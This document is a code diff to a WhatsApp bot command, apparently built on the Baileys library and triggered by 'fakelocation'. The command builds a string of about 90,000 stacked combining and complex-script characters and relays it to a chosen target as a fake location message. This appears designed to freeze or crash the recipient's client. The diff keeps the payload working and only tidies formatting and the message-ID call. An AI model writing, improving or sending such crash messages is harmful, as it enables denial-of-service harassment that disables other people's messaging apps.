@@ -1,14 +1,16 @@
 let handler = async (m, { conn }) => {
   const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
-  if (jid === conn.user.id) return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m })
+  if (jid === conn.user.id) {
+    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m })
+  }
 
   const objetivo = jid
 
   const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵'
   const repeticiones = 266
-  const caracteresPorRepeticion = caracter.length // 336
-  const totalBase = repeticiones * caracteresPorRepeticion // 89,376
-  const faltan = 90000 - totalBase // 624
+  const caracteresPorRepeticion = caracter.length
+  const totalBase = repeticiones * caracteresPorRepeticion
+  const faltan = 90000 - totalBase
 
   const textoLargo = caracter.repeat(repeticiones) + caracter.slice(0, faltan)
 
@@ -29,7 +31,7 @@ let handler = async (m, { conn }) => {
     }
   }
 
-  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: generateMessageID() })
+  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() })
 }
 
 handler.command = /^ubifalsa|ubicacionfalsa|fakelocation$/i
